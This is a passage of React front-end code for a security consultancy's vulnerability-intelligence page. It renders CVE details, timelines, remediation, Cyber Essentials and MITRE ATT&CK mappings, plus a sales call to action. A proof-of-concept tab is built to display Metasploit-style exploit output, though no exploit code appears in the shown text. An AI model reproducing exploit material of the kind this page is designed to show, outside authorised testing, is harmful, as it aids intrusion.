                    const labels = { AV: { N: 'Network', A: 'Adjacent', L: 'Local', P: 'Physical' }, AC: { L: 'Low', H: 'High' }, PR: { N: 'None', L: 'Low', H: 'High' }, UI: { N: 'None', R: 'Required' }, S: { U: 'Unchanged', C: 'Changed' }, C: { N: 'None', L: 'Low', H: 'High' }, I: { N: 'None', L: 'Low', H: 'High' }, A: { N: 'None', L: 'Low', H: 'High' } }
                    const fullKey = { AV: 'Attack Vector', AC: 'Complexity', PR: 'Privileges', UI: 'User Interact', S: 'Scope', C: 'Confidentiality', I: 'Integrity', A: 'Availability' }
                    return (
                      <div key={key} style={{ background: '#f8faff', border: '1px solid #dde3ec', padding: '0.6rem 0.75rem' }}>
                        <div style={{ fontFamily: mono, fontSize: '0.55rem', color: '#94a3b8', marginBottom: '0.2rem' }}>{fullKey[key] || key}</div>
                        <div style={{ fontFamily: display, fontSize: '0.85rem', letterSpacing: '1px', color: (val === 'H' || (val === 'N' && (key === 'PR' || key === 'UI'))) ? sc : '#64748b' }}>{labels[key]?.[val] || val}</div>
                      </div>
                    )
                  })}
                </div>
              </div>
            )}

            {tab === 'timeline' && (
              <div>
                <div style={{ fontFamily: mono, fontSize: '0.58rem', color: '#94a3b8', letterSpacing: '2px', marginBottom: '1.25rem' }}>DISCLOSURE & EXPLOITATION TIMELINE</div>
                <div style={{ position: 'relative', paddingLeft: '2rem' }}>
                  <div style={{ position: 'absolute', left: '8px', top: 0, bottom: 0, width: '1px', background: '#dde3ec' }} />
                  {cve.timeline.map((t, i) => (
                    <div key={i} style={{ position: 'relative', marginBottom: '1.5rem', paddingLeft: '1rem' }}>
                      <div style={{ position: 'absolute', left: '-1.75rem', top: '4px', width: '10px', height: '10px', borderRadius: '50%', background: sc, border: '2px solid #f4f6f8' }} />
                      <div style={{ fontFamily: mono, fontSize: '0.65rem', color: sc, marginBottom: '0.25rem' }}>{t.date}</div>
                      <div style={{ fontSize: '0.83rem', color: '#334155', lineHeight: 1.6 }}>{t.event}</div>
                    </div>
                  ))}
                </div>
              </div>
            )}

            {tab === 'poc' && (
              <div>
                <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: '0.75rem' }}>
                  <div style={{ fontFamily: mono, fontSize: '0.58rem', color: '#dc2626', letterSpacing: '2px' }}>PROOF OF CONCEPT / DETECTION</div>
                </div>
                <pre style={{ fontFamily: mono, fontSize: '0.72rem', color: '#b8d468', background: '#0f172a', padding: '1.25rem', border: '1px solid #1e293b', whiteSpace: 'pre-wrap', lineHeight: 1.8, maxHeight: '360px', overflow: 'auto' }}>
                  {cve.poc.split('\n').map((line, i) => {
                    const c = line.startsWith('#') ? '#64748b' : line.startsWith('use ') || line.startsWith('msf') ? '#a78bfa' : line.startsWith('set ') || line.startsWith('run') ? '#60a5fa' : line.includes('uid=0') || line.includes('root') ? '#10b981' : '#b8d468'
                    return <span key={i} style={{ color: c, display: 'block' }}>{line}</span>
                  })}
                </pre>
                <div style={{ marginTop: '0.75rem', fontFamily: mono, fontSize: '0.58rem', color: '#92400e', letterSpacing: '1px', padding: '0.5rem 0.75rem', border: '1px solid #fde68a', background: '#fefce8' }}>
                  ⚠ FOR EDUCATIONAL AND AUTHORISED TESTING ONLY — COMPUTER MISUSE ACT 1990
                </div>
              </div>
            )}

            {tab === 'remediation' && (
              <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: '1.5rem' }}>
                <div>
                  <div style={{ fontFamily: mono, fontSize: '0.58rem', color: '#16a34a', letterSpacing: '2px', marginBottom: '0.75rem' }}>REMEDIATION STEPS</div>
                  <pre style={{ fontFamily: mono, fontSize: '0.72rem', color: '#334155', background: '#f0fdf4', padding: '1.25rem', border: '1px solid #bbf7d0', borderLeft: '3px solid #16a34a', whiteSpace: 'pre-wrap', lineHeight: 1.8 }}>{cve.remediation}</pre>
                </div>
                <div>
                  <div style={{ fontFamily: mono, fontSize: '0.58rem', color: '#1d4ed8', letterSpacing: '2px', marginBottom: '0.75rem' }}>CE CONTROL AREA IMPACT</div>
                  <div style={{ background: '#f0f7ff', border: '1px solid #bfdbfe', padding: '1.25rem', marginBottom: '1rem' }}>
                    <div style={{ fontFamily: display, fontSize: '1rem', letterSpacing: '1px', color: AREA_COLORS[cve.ce] || '#1d4ed8', marginBottom: '0.5rem' }}>{cve.ce}</div>
                    <div style={{ fontSize: '0.78rem', color: '#334155', lineHeight: 1.65 }}>This vulnerability maps to the NCSC Cyber Essentials <strong style={{ color: AREA_COLORS[cve.ce] || '#1d4ed8' }}>{cve.ce}</strong> control area. Critical patches must be applied within 14 days under CE v3.3 — automatic fail if exceeded.</div>
                  </div>
                  <div style={{ padding: '0.75rem', background: cve.cisa_kev ? '#fef2f2' : '#fffbeb', border: `1px solid ${cve.cisa_kev ? '#fecaca' : '#fde68a'}`, fontFamily: mono, fontSize: '0.65rem', color: cve.cisa_kev ? '#dc2626' : '#d97706', letterSpacing: '1px' }}>
                    {cve.cisa_kev ? '🔴 CISA KEV — IMMEDIATE ACTION REQUIRED' : '🟡 HIGH PRIORITY — PATCH WITHIN CE 14-DAY WINDOW'}
                  </div>
                </div>
              </div>
            )}

            {tab === 'mitre' && (
              <div>
                <div style={{ fontFamily: mono, fontSize: '0.58rem', color: '#94a3b8', letterSpacing: '2px', marginBottom: '1.25rem' }}>MITRE ATT&CK FRAMEWORK MAPPING</div>
                <div style={{ display: 'flex', flexDirection: 'column', gap: '0.75rem' }}>
                  {cve.mitre.map((m, i) => {
                    const [id, desc] = m.split(' — ')
                    return (
                      <div key={i} style={{ display: 'flex', alignItems: 'center', gap: '1rem', background: '#f8faff', padding: '0.85rem 1.25rem', border: '1px solid #dde3ec' }}>
                        <span style={{ fontFamily: mono, fontSize: '0.72rem', color: '#dc2626', fontWeight: 700, flexShrink: 0 }}>{id}</span>
                        <span style={{ fontSize: '0.83rem', color: '#334155' }}>{desc}</span>
                        <a href={`https://attack.mitre.org/techniques/${id.split(' ')[0].replace('.', '/')}`} target="_blank" rel="noreferrer" style={{ marginLeft: 'auto', fontFamily: mono, fontSize: '0.55rem', color: '#1d4ed8', textDecoration: 'none', flexShrink: 0 }}>ATT&CK ↗</a>
                      </div>
                    )
                  })}
                </div>
              </div>
            )}

          </div>
        </div>
      )}
    </div>
  )
}

export default function Vulnerabilities() {
  const [openId, setOpenId] = useState(null)
  const [search, setSearch] = useState('')
  const [filterSev, setFilterSev] = useState('ALL')
  const [filterSource, setFilterSource] = useState('ALL')
  const [sortBy, setSortBy] = useState('cvss')

  const filtered = CVE_DB
    .filter(c => {
      if (filterSev !== 'ALL' && c.severity !== filterSev) return false
      if (filterSource === 'LAB' && !c.lab) return false
      if (filterSource === 'CURRENT' && c.lab) return false
      if (filterSource === 'CISA_KEV' && !c.cisa_kev) return false
      if (search) {
        const q = search.toLowerCase()
        return c.id.toLowerCase().includes(q) || c.title.toLowerCase().includes(q) || c.affected.toLowerCase().includes(q) || c.desc.toLowerCase().includes(q)
      }
      return true
    })
    .sort((a, b) => sortBy === 'cvss' ? b.cvss - a.cvss : sortBy === 'date' ? new Date(b.published) - new Date(a.published) : a.id.localeCompare(b.id))

  const stats = [
    { n: String(CVE_DB.length), l: 'CVEs Documented', c: '#0f172a' },
    { n: String(CVE_DB.filter(c => c.severity === 'CRITICAL').length), l: 'Critical Severity', c: '#dc2626' },
    { n: String(CVE_DB.filter(c => c.cisa_kev).length), l: 'CISA KEV Listed', c: '#dc2626' },
    { n: String(CVE_DB.filter(c => c.exploitedInWild).length), l: 'Exploited In Wild', c: '#d97706' },
    { n: String(CVE_DB.filter(c => c.lab).length), l: 'Lab Confirmed', c: '#16a34a' },
    { n: '10.0', l: 'Highest CVSS Score', c: '#dc2626' },
  ]

  return (
    <div style={{ fontFamily: body, background: '#f4f6f8', color: '#1a2332', minHeight: '100vh' }}>
      <style>{`
        @import url('https://fonts.googleapis.com/css2?family=Bebas+Neue&family=Barlow+Condensed:wght@300;400;600;700&family=Share+Tech+Mono&family=Cormorant+Garamond:ital,wght@1,400;1,600&display=swap');
        @media(max-width:768px){ .vuln-stats{grid-template-columns:repeat(3,1fr)!important;} .vuln-detail{grid-template-columns:1fr!important;} }
      `}</style>

      {/* HERO */}
      <div style={{ padding: '5rem 1.5rem 4rem', background: 'linear-gradient(135deg, #0f172a 0%, #1e3a5f 50%, #0f172a 100%)', position: 'relative', overflow: 'hidden' }}>
        <div style={{ position: 'absolute', top: '20%', right: '10%', width: '400px', height: '400px', borderRadius: '50%', background: 'radial-gradient(circle, rgba(220,38,38,0.08) 0%, transparent 70%)', filter: 'blur(80px)', pointerEvents: 'none' }} />
        <div style={{ maxWidth: '1100px', margin: '0 auto', position: 'relative', zIndex: 2 }}>
          <div style={{ fontFamily: mono, fontSize: '10px', letterSpacing: '4px', color: '#60a5fa', marginBottom: '1.5rem' }}>// TANASIOM AEGIS SECURITY & COMPLIANCE — VULNERABILITY INTELLIGENCE</div>
          <h1 style={{ fontFamily: display, fontSize: 'clamp(2.5rem, 7vw, 5.5rem)', lineHeight: 0.9, letterSpacing: '3px', color: '#f0f6ff', marginBottom: '1.25rem' }}>
            VULNERABILITY<br /><span style={{ color: '#f87171' }}>INTELLIGENCE.</span>
          </h1>
          <p style={{ fontFamily: serif, fontSize: 'clamp(1rem, 2vw, 1.2rem)', fontStyle: 'italic', color: 'rgba(224,236,255,0.7)', maxWidth: '680px', lineHeight: 1.8, marginBottom: '2rem' }}>
            Lab-confirmed findings from controlled engagements combined with live threat intelligence. Every CVE mapped to NCSC Cyber Essentials control areas — with full technical analysis, exploitation evidence, and remediation.
          </p>

          {/* STATS */}
          <div className="vuln-stats" style={{ display: 'grid', gridTemplateColumns: 'repeat(6, 1fr)', gap: '1px', background: 'rgba(255,255,255,0.1)', maxWidth: '800px' }}>
            {stats.map(s => (
              <div key={s.l} style={{ background: 'rgba(255,255,255,0.06)', padding: '1rem 0.75rem', textAlign: 'center' }}>
                <div style={{ fontFamily: display, fontSize: '1.6rem', color: s.c === '#0f172a' ? '#f0f6ff' : s.c, lineHeight: 1 }}>{s.n}</div>
                <div style={{ fontFamily: mono, fontSize: '0.48rem', color: 'rgba(224,236,255,0.45)', letterSpacing: '1px', marginTop: '0.2rem', lineHeight: 1.4 }}>{s.l}</div>
              </div>
            ))}
          </div>
        </div>
      </div>

      {/* ADVISORY BANNER */}
      <div style={{ background: '#fef2f2', borderBottom: '1px solid #fecaca', padding: '0.75rem 1.5rem', display: 'flex', alignItems: 'center', gap: '1rem', flexWrap: 'wrap' }}>
        <div style={{ maxWidth: '1100px', margin: '0 auto', display: 'flex', alignItems: 'center', gap: '1rem', flexWrap: 'wrap', width: '100%' }}>
          <span style={{ width: 8, height: 8, borderRadius: '50%', background: '#dc2626', display: 'inline-block', flexShrink: 0 }} />
          <span style={{ fontFamily: mono, fontSize: '0.62rem', color: '#dc2626', letterSpacing: '1px', fontWeight: 700 }}>ACTIVE THREAT ADVISORY</span>
          <span style={{ fontFamily: mono, fontSize: '0.62rem', color: '#64748b' }}>
            {CVE_DB.filter(c => c.cisa_kev).length} CVEs on CISA KEV requiring immediate action ·{' '}
            {CVE_DB.filter(c => c.exploitedInWild).length} confirmed exploited in the wild ·{' '}
            21,500+ new CVEs disclosed in H1 2025
          </span>
          <a href="https://www.cisa.gov/known-exploited-vulnerabilities-catalog" target="_blank" rel="noreferrer" style={{ marginLeft: 'auto', fontFamily: mono, fontSize: '0.6rem', color: '#1d4ed8', textDecoration: 'none', border: '1px solid #bfdbfe', padding: '0.3rem 0.75rem', flexShrink: 0 }}>CISA KEV CATALOG ↗</a>
        </div>
      </div>

      {/* FILTER BAR */}
      <div style={{ background: '#ffffff', borderBottom: '1px solid #dde3ec', padding: '1rem 1.5rem', position: 'sticky', top: '56px', zIndex: 50 }}>
        <div style={{ maxWidth: '1100px', margin: '0 auto', display: 'flex', gap: '0.75rem', flexWrap: 'wrap', alignItems: 'center' }}>
          <div style={{ position: 'relative', flex: 1, minWidth: '200px' }}>
            <input value={search} onChange={e => setSearch(e.target.value)} placeholder="Search CVE ID, title, affected software..." style={{ width: '100%', background: '#f8faff', border: '1px solid #dde3ec', color: '#0f172a', fontFamily: body, fontSize: '0.82rem', padding: '0.5rem 0.75rem', outline: 'none', transition: 'border-color 0.2s' }}
              onFocus={e => e.target.style.borderColor = '#1d4ed8'}
              onBlur={e => e.target.style.borderColor = '#dde3ec'} />
          </div>
          <div style={{ display: 'flex', gap: '0.3rem' }}>
            {['ALL', 'CRITICAL', 'HIGH'].map(s => (
              <button key={s} onClick={() => setFilterSev(s)} style={{ background: filterSev === s ? (s === 'CRITICAL' ? '#dc2626' : s === 'HIGH' ? '#d97706' : '#0f172a') : 'transparent', border: `1px solid ${filterSev === s ? 'transparent' : '#dde3ec'}`, color: filterSev === s ? '#fff' : '#64748b', fontFamily: mono, fontSize: '0.58rem', letterSpacing: '1px', padding: '0.3rem 0.65rem', cursor: 'pointer', transition: 'all 0.15s' }}>{s}</button>
            ))}
          </div>
          <div style={{ display: 'flex', gap: '0.3rem' }}>
            {[['ALL', 'All Sources'], ['LAB', 'Lab Confirmed'], ['CURRENT', 'Current Threats'], ['CISA_KEV', 'CISA KEV']].map(([val, label]) => (
              <button key={val} onClick={() => setFilterSource(val)} style={{ background: filterSource === val ? '#1d4ed8' : 'transparent', border: `1px solid ${filterSource === val ? '#1d4ed8' : '#dde3ec'}`, color: filterSource === val ? '#fff' : '#64748b', fontFamily: mono, fontSize: '0.58rem', letterSpacing: '1px', padding: '0.3rem 0.65rem', cursor: 'pointer', transition: 'all 0.15s' }}>{label}</button>
            ))}
          </div>
          <select value={sortBy} onChange={e => setSortBy(e.target.value)} style={{ background: '#f8faff', border: '1px solid #dde3ec', color: '#64748b', fontFamily: mono, fontSize: '0.62rem', padding: '0.35rem 0.65rem', cursor: 'pointer', outline: 'none' }}>
            <option value="cvss">Sort: CVSS</option>
            <option value="date">Sort: Date</option>
            <option value="id">Sort: CVE ID</option>
          </select>
          <div style={{ fontFamily: mono, fontSize: '0.62rem', color: '#94a3b8', whiteSpace: 'nowrap', marginLeft: 'auto' }}>{filtered.length} / {CVE_DB.length} CVEs</div>
        </div>
      </div>

      {/* CVE LIST */}
      <div style={{ maxWidth: '1100px', margin: '0 auto', padding: '2.5rem 1.5rem' }}>
        <div style={{ display: 'flex', flexDirection: 'column', gap: '1px', background: '#dde3ec', marginBottom: '3rem' }}>
          {filtered.length === 0
            ? <div style={{ background: '#ffffff', padding: '3rem', textAlign: 'center', fontFamily: mono, fontSize: '0.82rem', color: '#94a3b8' }}>No CVEs match current filters.</div>
            : filtered.map(cve => <CVECard key={cve.id} cve={cve} isOpen={openId === cve.id} onToggle={() => setOpenId(openId === cve.id ? null : cve.id)} />)
          }
        </div>

        {/* CE MAPPING */}
        <div style={{ background: '#ffffff', border: '1px solid #dde3ec', padding: '1.75rem', marginBottom: '2rem' }}>
          <div style={{ fontFamily: mono, fontSize: '9px', color: '#1d4ed8', letterSpacing: '3px', marginBottom: '1.5rem' }}>// CVE → CYBER ESSENTIALS CONTROL AREA MAPPING</div>
          <div style={{ display: 'grid', gridTemplateColumns: 'repeat(5, 1fr)', gap: '1px', background: '#dde3ec' }}>
            {['Firewalls', 'Secure Configuration', 'Update Management', 'User Access Control', 'Malware Protection'].map(area => {
              const count = CVE_DB.filter(c => c.ce === area).length
              const color = AREA_COLORS[area]
              return (
                <div key={area} style={{ background: '#f8faff', padding: '1.25rem', textAlign: 'center', cursor: 'pointer', transition: 'all 0.2s', borderTop: `3px solid ${color}` }}
                  onClick={() => { setSearch(area); setFilterSev('ALL'); setFilterSource('ALL') }}
                  onMouseEnter={e => e.currentTarget.style.background = '#eff6ff'}
                  onMouseLeave={e => e.currentTarget.style.background = '#f8faff'}
                >
                  <div style={{ fontFamily: display, fontSize: '2rem', color, lineHeight: 1, marginBottom: '0.35rem' }}>{count}</div>
                  <div style={{ fontFamily: display, fontSize: '0.72rem', letterSpacing: '1px', color: '#0f172a', marginBottom: '0.2rem' }}>{area}</div>
                  <div style={{ fontFamily: mono, fontSize: '0.52rem', color: '#94a3b8' }}>Click to filter</div>
                </div>
              )
            })}
          </div>
        </div>

        {/* RESOURCES */}
        <div style={{ background: '#ffffff', border: '1px solid #dde3ec', padding: '1.75rem', marginBottom: '2rem' }}>
          <div style={{ fontFamily: mono, fontSize: '9px', color: '#1d4ed8', letterSpacing: '3px', marginBottom: '1.5rem' }}>// INTELLIGENCE & REFERENCE RESOURCES</div>
          <div style={{ display: 'grid', gridTemplateColumns: 'repeat(auto-fit, minmax(220px, 1fr))', gap: '1px', background: '#dde3ec' }}>
            {RESOURCES.map(r => (
              <a key={r.label} href={r.url} target="_blank" rel="noreferrer" style={{ background: '#f8faff', padding: '1.1rem', textDecoration: 'none', display: 'block', transition: 'all 0.2s', borderTop: '2px solid transparent' }}
                onMouseEnter={e => { e.currentTarget.style.background = '#eff6ff'; e.currentTarget.style.borderTopColor = '#1d4ed8' }}
                onMouseLeave={e => { e.currentTarget.style.background = '#f8faff'; e.currentTarget.style.borderTopColor = 'transparent' }}
              >
                <div style={{ fontFamily: mono, fontSize: '0.52rem', color: '#1d4ed8', letterSpacing: '2px', marginBottom: '0.3rem' }}>{r.cat}</div>
                <div style={{ fontSize: '0.82rem', color: '#0f172a', fontWeight: 600, marginBottom: '0.2rem' }}>{r.label} ↗</div>
                <div style={{ fontFamily: mono, fontSize: '0.58rem', color: '#94a3b8', lineHeight: 1.4 }}>{r.desc}</div>
              </a>
            ))}
          </div>
        </div>

        {/* CTA */}
        <div style={{ background: 'linear-gradient(135deg, #0f172a 0%, #1e3a5f 50%, #0f172a 100%)', padding: '3rem', textAlign: 'center', position: 'relative', overflow: 'hidden' }}>
          <div style={{ position: 'absolute', top: '50%', left: '50%', transform: 'translate(-50%,-50%)', width: '400px', height: '200px', borderRadius: '50%', background: 'radial-gradient(circle, rgba(59,130,246,0.08) 0%, transparent 70%)', filter: 'blur(60px)', pointerEvents: 'none' }} />
          <div style={{ position: 'relative', zIndex: 1 }}>
            <div style={{ fontFamily: mono, fontSize: '9px', color: '#60a5fa', letterSpacing: '4px', marginBottom: '1rem' }}>// THE QUESTION THAT MATTERS</div>
            <h3 style={{ fontFamily: display, fontSize: 'clamp(2rem, 5vw, 3.5rem)', letterSpacing: '3px', color: '#f0f6ff', lineHeight: 0.9, marginBottom: '1rem' }}>
              DO ANY OF THESE<br /><span style={{ color: '#60a5fa' }}>APPLY TO YOUR NETWORK?</span>
            </h3>
            <p style={{ fontFamily: serif, fontSize: '1.1rem', fontStyle: 'italic', color: 'rgba(224,236,255,0.6)', maxWidth: '480px', margin: '0 auto 2rem', lineHeight: 1.8 }}>
              The free self-check maps your environment against the same control areas. In 15 minutes you'll know exactly where you stand.
            </p>
            <div style={{ display: 'flex', gap: '1rem', justifyContent: 'center', flexWrap: 'wrap' }}>
              <Link to="/framework" style={{ background: '#1d4ed8', color: '#fff', fontFamily: display, fontSize: '1.1rem', letterSpacing: '3px', padding: '1rem 2.5rem', textDecoration: 'none', clipPath: 'polygon(0 0, calc(100% - 10px) 0, 100% 10px, 100% 100%, 10px 100%, 0 calc(100% - 10px))', transition: 'all 0.2s' }}
                onMouseEnter={e => e.currentTarget.style.background = '#1e40af'}
                onMouseLeave={e => e.currentTarget.style.background = '#1d4ed8'}
              >START FREE SELF-CHECK →</Link>
              <Link to="/contact" style={{ background: 'transparent', color: 'rgba(224,236,255,0.7)', fontFamily: mono, fontSize: '0.78rem', letterSpacing: '2px', padding: '1rem 1.75rem', border: '1px solid rgba(255,255,255,0.2)', textDecoration: 'none', transition: 'all 0.2s' }}
                onMouseEnter={e => { e.currentTarget.style.borderColor = 'rgba(255,255,255,0.5)'; e.currentTarget.style.color = '#fff' }}
                onMouseLeave={e => { e.currentTarget.style.borderColor = 'rgba(255,255,255,0.2)'; e.currentTarget.style.color = 'rgba(224,236,255,0.7)' }}
              >BOOK GAP REVIEW — £397</Link>
            </div>
          </div>
        </div>

      </div>
    </div>
  )
}